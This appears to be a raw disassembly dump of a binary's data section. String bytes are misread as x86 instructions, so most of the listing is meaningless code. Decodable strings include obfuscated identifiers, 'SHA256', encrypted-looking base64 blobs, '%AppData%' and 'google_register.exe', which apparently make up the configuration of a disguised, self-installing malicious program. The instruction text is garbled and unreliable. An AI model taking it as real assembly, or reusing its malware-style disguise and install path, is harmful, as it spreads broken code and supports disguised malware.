  409eb3:	77 73                	ja     0x409f28
  409eb5:	49                   	dec    %ecx
  409eb6:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409eb9:	74 69                	je     0x409f24
  409ebb:	74 79                	je     0x409f36
  409ebd:	00 49 73             	add    %cl,0x73(%ecx)
  409ec0:	4e                   	dec    %esi
  409ec1:	75 6c                	jne    0x409f2f
  409ec3:	6c                   	insb   (%dx),%es:(%edi)
  409ec4:	4f                   	dec    %edi
  409ec5:	72 45                	jb     0x409f0c
  409ec7:	6d                   	insl   (%dx),%es:(%edi)
  409ec8:	70 74                	jo     0x409f3e
  409eca:	79 00                	jns    0x409ecc
  409ecc:	6c                   	insb   (%dx),%es:(%edi)
  409ecd:	77 42                	ja     0x409f11
  409ecf:	69 65 71 70 61 53 70 	imul   $0x70536170,0x71(%ebp),%esp
  409ed6:	66 42                	inc    %dx
  409ed8:	7a 00                	jp     0x409eda
  409eda:	62 6c 67 51          	bound  %ebp,0x51(%edi,%eiz,2)
  409ede:	63 4f 66             	arpl   %ecx,0x66(%edi)
  409ee1:	41                   	inc    %ecx
  409ee2:	52                   	push   %edx
  409ee3:	41                   	inc    %ecx
  409ee4:	79 67                	jns    0x409f4d
  409ee6:	61                   	popa
  409ee7:	64 7a 00             	fs jp  0x409eea
  409eea:	41                   	inc    %ecx
  409eeb:	77 79                	ja     0x409f66
  409eed:	79 48                	jns    0x409f37
  409eef:	67 64 68 41 56 7a 4e 	addr16 fs push $0x4e7a5641
  409ef6:	6b 7a 00 41          	imul   $0x41,0x0(%edx),%edi
  409efa:	4e                   	dec    %esi
  409efb:	53                   	push   %ebx
  409efc:	51                   	push   %ecx
  409efd:	50                   	push   %eax
  409efe:	6c                   	insb   (%dx),%es:(%edi)
  409eff:	76 77                	jbe    0x409f78
  409f01:	4f                   	dec    %edi
  409f02:	55                   	push   %ebp
  409f03:	6d                   	insl   (%dx),%es:(%edi)
  409f04:	7a 00                	jp     0x409f06
  409f06:	65 58                	gs pop %eax
  409f08:	4a                   	dec    %edx
  409f09:	5a                   	pop    %edx
  409f0a:	4d                   	dec    %ebp
  409f0b:	43                   	inc    %ebx
  409f0c:	50                   	push   %eax
  409f0d:	47                   	inc    %edi
  409f0e:	70 54                	jo     0x409f64
  409f10:	73 4c                	jae    0x409f5e
  409f12:	5a                   	pop    %edx
  409f13:	75 7a                	jne    0x409f8f
  409f15:	00 00                	add    %al,(%eax)
  409f17:	00 00                	add    %al,(%eax)
  409f19:	0d 53 00 48 00       	or     $0x480053,%eax
  409f1e:	41                   	inc    %ecx
  409f1f:	00 32                	add    %dh,(%edx)
  409f21:	00 35 00 36 00 00    	add    %dh,0x3600
  409f27:	81 59 45 00 4b 00 62 	sbbl   $0x62004b00,0x45(%ecx)
  409f2e:	00 48 00             	add    %cl,0x0(%eax)
  409f31:	46                   	inc    %esi
  409f32:	00 77 00             	add    %dh,0x0(%edi)
  409f35:	63 00                	arpl   %eax,(%eax)
  409f37:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  409f3b:	32 00                	xor    (%eax),%al
  409f3d:	73 00                	jae    0x409f3f
  409f3f:	6a 00                	push   $0x0
  409f41:	4c                   	dec    %esp
  409f42:	00 78 00             	add    %bh,0x0(%eax)
  409f45:	54                   	push   %esp
  409f46:	00 62 00             	add    %ah,0x0(%edx)
  409f49:	2f                   	das
  409f4a:	00 48 00             	add    %cl,0x0(%eax)
  409f4d:	71 00                	jno    0x409f4f
  409f4f:	79 00                	jns    0x409f51
  409f51:	4d                   	dec    %ebp
  409f52:	00 2f                	add    %ch,(%edi)
  409f54:	00 76 00             	add    %dh,0x0(%esi)
  409f57:	6e                   	outsb  %ds:(%esi),(%dx)
  409f58:	00 38                	add    %bh,(%eax)
  409f5a:	00 53 00             	add    %dl,0x0(%ebx)
  409f5d:	57                   	push   %edi
  409f5e:	00 53 00             	add    %dl,0x0(%ebx)
  409f61:	6f                   	outsl  %ds:(%esi),(%dx)
  409f62:	00 68 00             	add    %ch,0x0(%eax)
  409f65:	4e                   	dec    %esi
  409f66:	00 75 00             	add    %dh,0x0(%ebp)
  409f69:	6d                   	insl   (%dx),%es:(%edi)
  409f6a:	00 36                	add    %dh,(%esi)
  409f6c:	00 69 00             	add    %ch,0x0(%ecx)
  409f6f:	4a                   	dec    %edx
  409f70:	00 52 00             	add    %dl,0x0(%edx)
  409f73:	71 00                	jno    0x409f75
  409f75:	43                   	inc    %ebx
  409f76:	00 39                	add    %bh,(%ecx)
  409f78:	00 66 00             	add    %ah,0x0(%esi)
  409f7b:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  409f7f:	53                   	push   %ebx
  409f80:	00 49 00             	add    %cl,0x0(%ecx)
  409f83:	6d                   	insl   (%dx),%es:(%edi)
  409f84:	00 49 00             	add    %cl,0x0(%ecx)
  409f87:	51                   	push   %ecx
  409f88:	00 37                	add    %dh,(%edi)
  409f8a:	00 57 00             	add    %dl,0x0(%edi)
  409f8d:	4e                   	dec    %esi
  409f8e:	00 66 00             	add    %ah,0x0(%esi)
  409f91:	45                   	inc    %ebp
  409f92:	00 5a 00             	add    %bl,0x0(%edx)
  409f95:	54                   	push   %esp
  409f96:	00 59 00             	add    %bl,0x0(%ecx)
  409f99:	6b 00 56             	imul   $0x56,(%eax),%eax
  409f9c:	00 57 00             	add    %dl,0x0(%edi)
  409f9f:	62 00                	bound  %eax,(%eax)
  409fa1:	35 00 73 00 4d       	xor    $0x4d007300,%eax
  409fa6:	00 55 00             	add    %dl,0x0(%ebp)
  409fa9:	54                   	push   %esp
  409faa:	00 5a 00             	add    %bl,0x0(%edx)
  409fad:	41                   	inc    %ecx
  409fae:	00 51 00             	add    %dl,0x0(%ecx)
  409fb1:	49                   	dec    %ecx
  409fb2:	00 78 00             	add    %bh,0x0(%eax)
  409fb5:	54                   	push   %esp
  409fb6:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  409fba:	00 6e 00             	add    %ch,0x0(%esi)
  409fbd:	68 00 75 00 72       	push   $0x72007500
  409fc2:	00 67 00             	add    %ah,0x0(%edi)
  409fc5:	35 00 32 00 35       	xor    $0x35003200,%eax
  409fca:	00 41 00             	add    %al,0x0(%ecx)
  409fcd:	61                   	popa
  409fce:	00 45 00             	add    %al,0x0(%ebp)
  409fd1:	34 00                	xor    $0x0,%al
  409fd3:	33 00                	xor    (%eax),%eax
  409fd5:	79 00                	jns    0x409fd7
  409fd7:	72 00                	jb     0x409fd9
  409fd9:	71 00                	jno    0x409fdb
  409fdb:	67 00 65 00          	add    %ah,0x0(%di)
  409fdf:	2f                   	das
  409fe0:	00 77 00             	add    %dh,0x0(%edi)
  409fe3:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  409fe7:	5a                   	pop    %edx
  409fe8:	00 4f 00             	add    %cl,0x0(%edi)
  409feb:	42                   	inc    %edx
  409fec:	00 36                	add    %dh,(%esi)
  409fee:	00 73 00             	add    %dh,0x0(%ebx)
  409ff1:	79 00                	jns    0x409ff3
  409ff3:	43                   	inc    %ebx
  409ff4:	00 5a 00             	add    %bl,0x0(%edx)
  409ff7:	46                   	inc    %esi
  409ff8:	00 56 00             	add    %dl,0x0(%esi)
  409ffb:	41                   	inc    %ecx
  409ffc:	00 6d 00             	add    %ch,0x0(%ebp)
  409fff:	37                   	aaa
  40a000:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40a004:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a007:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  40a00b:	2b 00                	sub    (%eax),%eax
  40a00d:	32 00                	xor    (%eax),%al
  40a00f:	63 00                	arpl   %eax,(%eax)
  40a011:	77 00                	ja     0x40a013
  40a013:	57                   	push   %edi
  40a014:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  40a018:	00 31                	add    %dh,(%ecx)
  40a01a:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
  40a01e:	00 38                	add    %bh,(%eax)
  40a020:	00 35 00 48 00 47    	add    %dh,0x47004800
  40a026:	00 47 00             	add    %al,0x0(%edi)
  40a029:	4a                   	dec    %edx
  40a02a:	00 51 00             	add    %dl,0x0(%ecx)
  40a02d:	55                   	push   %ebp
  40a02e:	00 45 00             	add    %al,0x0(%ebp)
  40a031:	2b 00                	sub    (%eax),%eax
  40a033:	4c                   	dec    %esp
  40a034:	00 5a 00             	add    %bl,0x0(%edx)
  40a037:	53                   	push   %ebx
  40a038:	00 41 00             	add    %al,0x0(%ecx)
  40a03b:	76 00                	jbe    0x40a03d
  40a03d:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40a041:	62 00                	bound  %eax,(%eax)
  40a043:	61                   	popa
  40a044:	00 36                	add    %dh,(%esi)
  40a046:	00 38                	add    %bh,(%eax)
  40a048:	00 31                	add    %dh,(%ecx)
  40a04a:	00 63 00             	add    %ah,0x0(%ebx)
  40a04d:	4f                   	dec    %edi
  40a04e:	00 52 00             	add    %dl,0x0(%edx)
  40a051:	4c                   	dec    %esp
  40a052:	00 43 00             	add    %al,0x0(%ebx)
  40a055:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  40a059:	38 00                	cmp    %al,(%eax)
  40a05b:	33 00                	xor    (%eax),%eax
  40a05d:	37                   	aaa
  40a05e:	00 55 00             	add    %dl,0x0(%ebp)
  40a061:	66 00 31             	data16 add %dh,(%ecx)
  40a064:	00 6d 00             	add    %ch,0x0(%ebp)
  40a067:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  40a06b:	53                   	push   %ebx
  40a06c:	00 6b 00             	add    %ch,0x0(%ebx)
  40a06f:	38 00                	cmp    %al,(%eax)
  40a071:	4f                   	dec    %edi
  40a072:	00 51 00             	add    %dl,0x0(%ecx)
  40a075:	52                   	push   %edx
  40a076:	00 31                	add    %dh,(%ecx)
  40a078:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a07b:	30 00                	xor    %al,(%eax)
  40a07d:	55                   	push   %ebp
  40a07e:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40a084:	6e                   	outsb  %ds:(%esi),(%dx)
  40a085:	00 78 00             	add    %bh,0x0(%eax)
  40a088:	4b                   	dec    %ebx
  40a089:	00 7a 00             	add    %bh,0x0(%edx)
  40a08c:	37                   	aaa
  40a08d:	00 53 00             	add    %dl,0x0(%ebx)
  40a090:	68 00 73 00 46       	push   $0x46007300
  40a095:	00 55 00             	add    %dl,0x0(%ebp)
  40a098:	6f                   	outsl  %ds:(%esi),(%dx)
  40a099:	00 2f                	add    %ch,(%edi)
  40a09b:	00 70 00             	add    %dh,0x0(%eax)
  40a09e:	33 00                	xor    (%eax),%eax
  40a0a0:	77 00                	ja     0x40a0a2
  40a0a2:	4a                   	dec    %edx
  40a0a3:	00 56 00             	add    %dl,0x0(%esi)
  40a0a6:	6b 00 31             	imul   $0x31,(%eax),%eax
  40a0a9:	00 43 00             	add    %al,0x0(%ebx)
  40a0ac:	30 00                	xor    %al,(%eax)
  40a0ae:	32 00                	xor    (%eax),%al
  40a0b0:	70 00                	jo     0x40a0b2
  40a0b2:	56                   	push   %esi
  40a0b3:	00 79 00             	add    %bh,0x0(%ecx)
  40a0b6:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40a0ba:	32 00                	xor    (%eax),%al
  40a0bc:	2f                   	das
  40a0bd:	00 42 00             	add    %al,0x0(%edx)
  40a0c0:	79 00                	jns    0x40a0c2
  40a0c2:	6d                   	insl   (%dx),%es:(%edi)
  40a0c3:	00 37                	add    %dh,(%edi)
  40a0c5:	00 37                	add    %dh,(%edi)
  40a0c7:	00 49 00             	add    %cl,0x0(%ecx)
  40a0ca:	4f                   	dec    %edi
  40a0cb:	00 56 00             	add    %dl,0x0(%esi)
  40a0ce:	75 00                	jne    0x40a0d0
  40a0d0:	64 00 2f             	add    %ch,%fs:(%edi)
  40a0d3:	00 74 00 59          	add    %dh,0x59(%eax,%eax,1)
  40a0d7:	00 6d 00             	add    %ch,0x0(%ebp)
  40a0da:	41                   	inc    %ecx
  40a0db:	00 50 00             	add    %dl,0x0(%eax)
  40a0de:	47                   	inc    %edi
  40a0df:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a0e2:	6a 00                	push   $0x0
  40a0e4:	54                   	push   %esp
  40a0e5:	00 4e 00             	add    %cl,0x0(%esi)
  40a0e8:	52                   	push   %edx
  40a0e9:	00 48 00             	add    %cl,0x0(%eax)
  40a0ec:	70 00                	jo     0x40a0ee
  40a0ee:	46                   	inc    %esi
  40a0ef:	00 69 00             	add    %ch,0x0(%ecx)
  40a0f2:	75 00                	jne    0x40a0f4
  40a0f4:	65 00 30             	add    %dh,%gs:(%eax)
  40a0f7:	00 65 00             	add    %ah,0x0(%ebp)
  40a0fa:	73 00                	jae    0x40a0fc
  40a0fc:	57                   	push   %edi
  40a0fd:	00 6b 00             	add    %ch,0x0(%ebx)
  40a100:	72 00                	jb     0x40a102
  40a102:	56                   	push   %esi
  40a103:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a106:	4d                   	dec    %ebp
  40a107:	00 4b 00             	add    %cl,0x0(%ebx)
  40a10a:	52                   	push   %edx
  40a10b:	00 37                	add    %dh,(%edi)
  40a10d:	00 45 00             	add    %al,0x0(%ebp)
  40a110:	6d                   	insl   (%dx),%es:(%edi)
  40a111:	00 4d 00             	add    %cl,0x0(%ebp)
  40a114:	71 00                	jno    0x40a116
  40a116:	43                   	inc    %ebx
  40a117:	00 32                	add    %dh,(%edx)
  40a119:	00 6a 00             	add    %ch,0x0(%edx)
  40a11c:	75 00                	jne    0x40a11e
  40a11e:	30 00                	xor    %al,(%eax)
  40a120:	59                   	pop    %ecx
  40a121:	00 51 00             	add    %dl,0x0(%ecx)
  40a124:	32 00                	xor    (%eax),%al
  40a126:	74 00                	je     0x40a128
  40a128:	57                   	push   %edi
  40a129:	00 46 00             	add    %al,0x0(%esi)
  40a12c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a12d:	00 41 00             	add    %al,0x0(%ecx)
  40a130:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a135:	80 b1 44 00 62 00 49 	xorb   $0x49,0x620044(%ecx)
  40a13c:	00 49 00             	add    %cl,0x0(%ecx)
  40a13f:	46                   	inc    %esi
  40a140:	00 52 00             	add    %dl,0x0(%edx)
  40a143:	2f                   	das
  40a144:	00 4d 00             	add    %cl,0x0(%ebp)
  40a147:	2b 00                	sub    (%eax),%eax
  40a149:	58                   	pop    %eax
  40a14a:	00 62 00             	add    %ah,0x0(%edx)
  40a14d:	34 00                	xor    $0x0,%al
  40a14f:	78 00                	js     0x40a151
  40a151:	52                   	push   %edx
  40a152:	00 69 00             	add    %ch,0x0(%ecx)
  40a155:	73 00                	jae    0x40a157
  40a157:	38 00                	cmp    %al,(%eax)
  40a159:	45                   	inc    %ebp
  40a15a:	00 68 00             	add    %ch,0x0(%eax)
  40a15d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a15e:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40a162:	00 41 00             	add    %al,0x0(%ecx)
  40a165:	45                   	inc    %ebp
  40a166:	00 43 00             	add    %al,0x0(%ebx)
  40a169:	70 00                	jo     0x40a16b
  40a16b:	42                   	inc    %edx
  40a16c:	00 75 00             	add    %dh,0x0(%ebp)
  40a16f:	69 00 63 00 49 00    	imul   $0x490063,(%eax),%eax
  40a175:	63 00                	arpl   %eax,(%eax)
  40a177:	56                   	push   %esi
  40a178:	00 41 00             	add    %al,0x0(%ecx)
  40a17b:	6d                   	insl   (%dx),%es:(%edi)
  40a17c:	00 45 00             	add    %al,0x0(%ebp)
  40a17f:	75 00                	jne    0x40a181
  40a181:	7a 00                	jp     0x40a183
  40a183:	36 00 32             	add    %dh,%ss:(%edx)
  40a186:	00 46 00             	add    %al,0x0(%esi)
  40a189:	72 00                	jb     0x40a18b
  40a18b:	6b 00 70             	imul   $0x70,(%eax),%eax
  40a18e:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40a192:	00 63 00             	add    %ah,0x0(%ebx)
  40a195:	58                   	pop    %eax
  40a196:	00 4b 00             	add    %cl,0x0(%ebx)
  40a199:	54                   	push   %esp
  40a19a:	00 35 00 58 00 48    	add    %dh,0x48005800
  40a1a0:	00 7a 00             	add    %bh,0x0(%edx)
  40a1a3:	33 00                	xor    (%eax),%eax
  40a1a5:	4b                   	dec    %ebx
  40a1a6:	00 75 00             	add    %dh,0x0(%ebp)
  40a1a9:	2b 00                	sub    (%eax),%eax
  40a1ab:	39 00                	cmp    %eax,(%eax)
  40a1ad:	35 00 6b 00 37       	xor    $0x37006b00,%eax
  40a1b2:	00 6f 00             	add    %ch,0x0(%edi)
  40a1b5:	45                   	inc    %ebp
  40a1b6:	00 4a 00             	add    %cl,0x0(%edx)
  40a1b9:	6d                   	insl   (%dx),%es:(%edi)
  40a1ba:	00 65 00             	add    %ah,0x0(%ebp)
  40a1bd:	68 00 71 00 6e       	push   $0x6e007100
  40a1c2:	00 66 00             	add    %ah,0x0(%esi)
  40a1c5:	58                   	pop    %eax
  40a1c6:	00 41 00             	add    %al,0x0(%ecx)
  40a1c9:	46                   	inc    %esi
  40a1ca:	00 52 00             	add    %dl,0x0(%edx)
  40a1cd:	50                   	push   %eax
  40a1ce:	00 35 00 66 00 5a    	add    %dh,0x5a006600
  40a1d4:	00 52 00             	add    %dl,0x0(%edx)
  40a1d7:	73 00                	jae    0x40a1d9
  40a1d9:	74 00                	je     0x40a1db
  40a1db:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1dc:	00 66 00             	add    %ah,0x0(%esi)
  40a1df:	54                   	push   %esp
  40a1e0:	00 77 00             	add    %dh,0x0(%edi)
  40a1e3:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a1e8:	80 b1 77 00 4b 00 53 	xorb   $0x53,0x4b0077(%ecx)
  40a1ef:	00 56 00             	add    %dl,0x0(%esi)
  40a1f2:	78 00                	js     0x40a1f4
  40a1f4:	4b                   	dec    %ebx
  40a1f5:	00 55 00             	add    %dl,0x0(%ebp)
  40a1f8:	71 00                	jno    0x40a1fa
  40a1fa:	44                   	inc    %esp
  40a1fb:	00 65 00             	add    %ah,0x0(%ebp)
  40a1fe:	46                   	inc    %esi
  40a1ff:	00 68 00             	add    %ch,0x0(%eax)
  40a202:	4a                   	dec    %edx
  40a203:	00 37                	add    %dh,(%edi)
  40a205:	00 61 00             	add    %ah,0x0(%ecx)
  40a208:	45                   	inc    %ebp
  40a209:	00 67 00             	add    %ah,0x0(%edi)
  40a20c:	37                   	aaa
  40a20d:	00 65 00             	add    %ah,0x0(%ebp)
  40a210:	7a 00                	jp     0x40a212
  40a212:	6a 00                	push   $0x0
  40a214:	74 00                	je     0x40a216
  40a216:	2f                   	das
  40a217:	00 51 00             	add    %dl,0x0(%ecx)
  40a21a:	4f                   	dec    %edi
  40a21b:	00 45 00             	add    %al,0x0(%ebp)
  40a21e:	36 00 30             	add    %dh,%ss:(%eax)
  40a221:	00 38                	add    %bh,(%eax)
  40a223:	00 6e 00             	add    %ch,0x0(%esi)
  40a226:	79 00                	jns    0x40a228
  40a228:	37                   	aaa
  40a229:	00 30                	add    %dh,(%eax)
  40a22b:	00 69 00             	add    %ch,0x0(%ecx)
  40a22e:	30 00                	xor    %al,(%eax)
  40a230:	74 00                	je     0x40a232
  40a232:	75 00                	jne    0x40a234
  40a234:	68 00 7a 00 59       	push   $0x59007a00
  40a239:	00 44 00 79          	add    %al,0x79(%eax,%eax,1)
  40a23d:	00 68 00             	add    %ch,0x0(%eax)
  40a240:	56                   	push   %esi
  40a241:	00 31                	add    %dh,(%ecx)
  40a243:	00 53 00             	add    %dl,0x0(%ebx)
  40a246:	6c                   	insb   (%dx),%es:(%edi)
  40a247:	00 45 00             	add    %al,0x0(%ebp)
  40a24a:	52                   	push   %edx
  40a24b:	00 37                	add    %dh,(%edi)
  40a24d:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  40a251:	00 53 00             	add    %dl,0x0(%ebx)
  40a254:	32 00                	xor    (%eax),%al
  40a256:	69 00 39 00 4f 00    	imul   $0x4f0039,(%eax),%eax
  40a25c:	37                   	aaa
  40a25d:	00 71 00             	add    %dh,0x0(%ecx)
  40a260:	6e                   	outsb  %ds:(%esi),(%dx)
  40a261:	00 78 00             	add    %bh,0x0(%eax)
  40a264:	54                   	push   %esp
  40a265:	00 30                	add    %dh,(%eax)
  40a267:	00 2b                	add    %ch,(%ebx)
  40a269:	00 36                	add    %dh,(%esi)
  40a26b:	00 50 00             	add    %dl,0x0(%eax)
  40a26e:	4b                   	dec    %ebx
  40a26f:	00 50 00             	add    %dl,0x0(%eax)
  40a272:	78 00                	js     0x40a274
  40a274:	51                   	push   %ecx
  40a275:	00 58 00             	add    %bl,0x0(%eax)
  40a278:	62 00                	bound  %eax,(%eax)
  40a27a:	48                   	dec    %eax
  40a27b:	00 66 00             	add    %ah,0x0(%esi)
  40a27e:	76 00                	jbe    0x40a280
  40a280:	2f                   	das
  40a281:	00 37                	add    %dh,(%edi)
  40a283:	00 41 00             	add    %al,0x0(%ecx)
  40a286:	58                   	pop    %eax
  40a287:	00 2f                	add    %ch,(%edi)
  40a289:	00 41 00             	add    %al,0x0(%ecx)
  40a28c:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  40a290:	56                   	push   %esi
  40a291:	00 55 00             	add    %dl,0x0(%ebp)
  40a294:	67 00 3d             	add    %bh,(%di)
  40a297:	00 3d 00 00 13 25    	add    %bh,0x25130000
  40a29d:	00 41 00             	add    %al,0x0(%ecx)
  40a2a0:	70 00                	jo     0x40a2a2
  40a2a2:	70 00                	jo     0x40a2a4
  40a2a4:	44                   	inc    %esp
  40a2a5:	00 61 00             	add    %ah,0x0(%ecx)
  40a2a8:	74 00                	je     0x40a2aa
  40a2aa:	61                   	popa
  40a2ab:	00 25 00 00 27 67    	add    %ah,0x67270000
  40a2b1:	00 6f 00             	add    %ch,0x0(%edi)
  40a2b4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2b5:	00 67 00             	add    %ah,0x0(%edi)
  40a2b8:	6c                   	insb   (%dx),%es:(%edi)
  40a2b9:	00 65 00             	add    %ah,0x0(%ebp)
  40a2bc:	5f                   	pop    %edi
  40a2bd:	00 72 00             	add    %dh,0x0(%edx)
  40a2c0:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a2c4:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  40a2ca:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a2ce:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a2d2:	78 00                	js     0x40a2d4
  40a2d4:	65 00 00             	add    %al,%gs:(%eax)
  40a2d7:	59                   	pop    %ecx
  40a2d8:	57                   	push   %edi
  40a2d9:	00 6a 00             	add    %ch,0x0(%edx)
  40a2dc:	52                   	push   %edx
  40a2dd:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a2e0:	53                   	push   %ebx
  40a2e1:	00 57 00             	add    %dl,0x0(%edi)
  40a2e4:	4a                   	dec    %edx
  40a2e5:	00 77 00             	add    %dh,0x0(%edi)
  40a2e8:	4d                   	dec    %ebp
  40a2e9:	00 30                	add    %dh,(%eax)
  40a2eb:	00 6b 00             	add    %ch,0x0(%ebx)
  40a2ee:	77 00                	ja     0x40a2f0
  40a2f0:	4d                   	dec    %ebp
  40a2f1:	00 6e 00             	add    %ch,0x0(%esi)
  40a2f4:	6c                   	insb   (%dx),%es:(%edi)
  40a2f5:	00 73 00             	add    %dh,0x0(%ebx)
  40a2f8:	53                   	push   %ebx
  40a2f9:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  40a2fd:	00 52 00             	add    %dl,0x0(%edx)
  40a300:	51                   	push   %ecx
  40a301:	00 55 00             	add    %dl,0x0(%ebp)
  40a304:	6c                   	insb   (%dx),%es:(%edi)
  40a305:	00 70 00             	add    %dh,0x0(%eax)
  40a308:	54                   	push   %esp
  40a309:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
  40a30d:	00 30                	add    %dh,(%eax)
  40a30f:	00 62 00             	add    %ah,0x0(%edx)
  40a312:	32 00                	xor    (%eax),%al
  40a314:	68 00 35 00 4e       	push   $0x4e003500
  40a319:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
  40a31d:	00 45 00             	add    %al,0x0(%ebp)
  40a320:	54                   	push   %esp
  40a321:	00 30                	add    %dh,(%eax)
  40a323:	00 31                	add    %dh,(%ecx)
  40a325:	00 35 00 55 00 6e    	add    %dh,0x6e005500
  40a32b:	00 6f 00             	add    %ch,0x0(%edi)
  40a32e:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  40a333:	52                   	push   %edx
  40a334:	00 71 00             	add    %dh,0x0(%ecx)
  40a337:	50                   	push   %eax
  40a338:	00 61 00             	add    %ah,0x0(%ecx)
  40a33b:	79 00                	jns    0x40a33d
  40a33d:	79 00                	jns    0x40a33f
  40a33f:	68 00 52 00 73       	push   $0x73005200
  40a344:	00 4f 00             	add    %cl,0x0(%edi)
  40a347:	6a 00                	push   $0x0
  40a349:	37                   	aaa
  40a34a:	00 5a 00             	add    %bl,0x0(%edx)
  40a34d:	59                   	pop    %ecx
  40a34e:	00 54 00 66          	add    %dl,0x66(%eax,%eax,1)
  40a352:	00 4f 00             	add    %cl,0x0(%edi)
  40a355:	2f                   	das
  40a356:	00 53 00             	add    %dl,0x0(%ebx)
  40a359:	45                   	inc    %ebp
  40a35a:	00 5a 00             	add    %bl,0x0(%edx)
  40a35d:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40a361:	4a                   	dec    %edx
  40a362:	00 78 00             	add    %bh,0x0(%eax)
  40a365:	42                   	inc    %edx
  40a366:	00 57 00             	add    %dl,0x0(%edi)
  40a369:	4d                   	dec    %ebp
  40a36a:	00 76 00             	add    %dh,0x0(%esi)
  40a36d:	78 00                	js     0x40a36f
  40a36f:	54                   	push   %esp
  40a370:	00 49 00             	add    %cl,0x0(%ecx)
  40a373:	68 00 55 00 55       	push   $0x55005500
  40a378:	00 53 00             	add    %dl,0x0(%ebx)
  40a37b:	69 00 34 00 4f 00    	imul   $0x4f0034,(%eax),%eax
  40a381:	52                   	push   %edx
  40a382:	00 76 00             	add    %dh,0x0(%esi)
  40a385:	35 00 30 00 79       	xor    $0x79003000,%eax
  40a38a:	00 57 00             	add    %dl,0x0(%edi)
  40a38d:	6c                   	insb   (%dx),%es:(%edi)
  40a38e:	00 33                	add    %dh,(%ebx)
  40a390:	00 7a 00             	add    %bh,0x0(%edx)
  40a393:	64 00 74 00 71       	add    %dh,%fs:0x71(%eax,%eax,1)
  40a398:	00 69 00             	add    %ch,0x0(%ecx)
  40a39b:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40a39f:	6b 00 2b             	imul   $0x2b,(%eax),%eax
  40a3a2:	00 73 00             	add    %dh,0x0(%ebx)
  40a3a5:	4a                   	dec    %edx
  40a3a6:	00 65 00             	add    %ah,0x0(%ebp)
  40a3a9:	56                   	push   %esi
  40a3aa:	00 4c 00 73          	add    %cl,0x73(%eax,%eax,1)
  40a3ae:	00 62 00             	add    %ah,0x0(%edx)
  40a3b1:	44                   	inc    %esp
  40a3b2:	00 32                	add    %dh,(%edx)
  40a3b4:	00 42 00             	add    %al,0x0(%edx)
  40a3b7:	2f                   	das
  40a3b8:	00 7a 00             	add    %bh,0x0(%edx)
  40a3bb:	6a 00                	push   $0x0
  40a3bd:	41                   	inc    %ecx
  40a3be:	00 30                	add    %dh,(%eax)
  40a3c0:	00 7a 00             	add    %bh,0x0(%edx)
  40a3c3:	2b 00                	sub    (%eax),%eax
  40a3c5:	4d                   	dec    %ebp
  40a3c6:	00 51 00             	add    %dl,0x0(%ecx)
  40a3c9:	5a                   	pop    %edx
  40a3ca:	00 30                	add    %dh,(%eax)
  40a3cc:	00 36                	add    %dh,(%esi)
  40a3ce:	00 77 00             	add    %dh,0x0(%edi)
  40a3d1:	4c                   	dec    %esp
  40a3d2:	00 69 00             	add    %ch,0x0(%ecx)
  40a3d5:	4e                   	dec    %esi
  40a3d6:	00 49 00             	add    %cl,0x0(%ecx)
  40a3d9:	37                   	aaa
  40a3da:	00 78 00             	add    %bh,0x0(%eax)
  40a3dd:	41                   	inc    %ecx
  40a3de:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40a3e4:	92                   	xchg   %eax,%edx
  40a3e5:	59                   	pop    %ecx
  40a3e6:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a3ea:	78 00                	js     0x40a3ec
  40a3ec:	50                   	push   %eax
  40a3ed:	00 48 00             	add    %cl,0x0(%eax)
  40a3f0:	69 00 61 00 55 00    	imul   $0x550061,(%eax),%eax
  40a3f6:	67 00 47 00          	add    %al,0x0(%bx)
  40a3fa:	4f                   	dec    %edi
  40a3fb:	00 62 00             	add    %ah,0x0(%edx)
  40a3fe:	6c                   	insb   (%dx),%es:(%edi)
  40a3ff:	00 70 00             	add    %dh,0x0(%eax)
  40a402:	34 00                	xor    $0x0,%al
  40a404:	66 00 6b 00          	data16 add %ch,0x0(%ebx)
  40a408:	73 00                	jae    0x40a40a
  40a40a:	6a 00                	push   $0x0
  40a40c:	33 00                	xor    (%eax),%eax
  40a40e:	47                   	inc    %edi
  40a40f:	00 62 00             	add    %ah,0x0(%edx)
  40a412:	44                   	inc    %esp
  40a413:	00 62 00             	add    %ah,0x0(%edx)
  40a416:	33 00                	xor    (%eax),%eax
  40a418:	35 00 70 00 68       	xor    $0x68007000,%eax
  40a41d:	00 51 00             	add    %dl,0x0(%ecx)
  40a420:	75 00                	jne    0x40a422
